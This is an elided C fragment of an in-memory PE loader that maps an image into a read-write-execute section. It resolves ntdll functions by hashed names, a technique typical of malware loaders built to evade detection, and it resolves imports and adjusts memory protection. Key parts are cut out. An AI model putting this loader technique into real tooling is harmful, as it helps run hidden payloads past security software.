...
static void ExecuteFromMemory(unsigned char* data) {
    ...
    // Create RWX section
    NtCreateSection_t NtCreateSection = (NtCreateSection_t)myGetProcAddressH(hNtdll, ntcreatesection);
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // Map initial RW view
    PVOID base = NULL;
    SIZE_T viewSize = 0;
    NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)myGetProcAddressH(hNtdll, ntmapviewofsection);
    ...
    // Resolve imports
    ResolveImport(hNtdll, (BYTE*)base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);

    // Unmap RW view
    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)myGetProcAddressH(hNtdll, ntunmapviewofsection);
    ...
    ULONG oldProtect;
    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)myGetProcAddressH(hNtdll, ntprotectvirtualmemory);
